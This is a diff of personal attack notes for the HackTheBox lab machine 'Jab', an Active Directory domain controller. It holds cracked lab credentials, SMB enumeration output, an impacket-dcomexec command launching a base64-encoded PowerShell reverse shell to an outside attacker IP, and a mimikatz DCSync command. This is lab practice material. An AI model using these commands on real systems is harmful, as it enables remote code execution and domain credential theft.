@@ -75,21 +75,46 @@ $krb5asrep$23$jmontgomery@JAB.HTB:1f25578988d68d430464bd51517906bb$98a20065c46c0
 
 jmontgomery:Midnight_121 ## user in pidgin showwed a pentest room showing tgs 
 
-svc_openfire:!@#$%^&*(1qazxsw 
+svc_openfire:!@#$%^&*(1qazxsw
+impacket-dcomexec -object MMC20 dc01.jab.htb/svc_openfire@10.10.11.4
 
 smbclient -L  //10.10.11.4/ -U svc_openfire !@#$%^&*(1qazxsw
-
+!@#$%^&*(1qazxsw
 smbclient -L  //10.10.11.4/ -U jmontgomery%Midnight_121
 smbclient //10.10.11.4/SYSLOG -U jmontgomery%Midnight_121
 
 ## Foothold
 jab.htb/jmontgomery:Midnight_121
 
+
+┌─[parrot@parrot]─[~/Desktop/HackingLab/HackTheBox/Machines/Jab]
+└──╼ $nxc smb 10.10.11.4 -u jmontgomery -p Midnight_121 --shares
+SMB         10.10.11.4      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.4      445    DC01             [+] jab.htb\jmontgomery:Midnight_121
+SMB         10.10.11.4      445    DC01             [*] Enumerated shares
+SMB         10.10.11.4      445    DC01             Share           Permissions     Remark
+SMB         10.10.11.4      445    DC01             -----           -----------     ------
+SMB         10.10.11.4      445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.11.4      445    DC01             C$                              Default share
+SMB         10.10.11.4      445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.11.4      445    DC01             NETLOGON        READ            Logon server share
+SMB         10.10.11.4      445    DC01             SYSVOL          READ   
+
+
+
+nxc ldap --bloudhound -ns -c All
+
+The user SVC_OPENFIRE@JAB.HTB has membership in the Distributed COM Users local group on the computer DC01.JAB.HTB.
+
+This can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods.
+
+
 ## User Privesc	
 
 
 ## Root 
 
+impacket-dcomexec -object MMC20 dc01.jab.htb/svc_openfire@10.10.11.4 'cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -silentcommand -debug
 
 
 
@@ -101,4 +126,38 @@ jab.htb/jmontgomery:Midnight_121
 python3-impacket/examples/GetNPUsers.py jab.htb/ -usersfile users.txt -format hashcat -outputfile
 
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+
+
+
+lsadump::dcsync /user:Administrator /domain:JAB.HTB
+
+$ComputerName = DC01.JAB.HTB
+lsadump::dcsync /user:DC01.JAB.HTB /domain:
+
+
+PS C:\> net user svc_openfire
+User name                    svc_openfire
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/22/2024 2:35:29 PM
+Password expires             Never
+Password changeable          1/23/2024 2:35:29 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   7/10/2024 7:10:41 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Distributed COM Users
+Global Group memberships     *Domain Users      
 
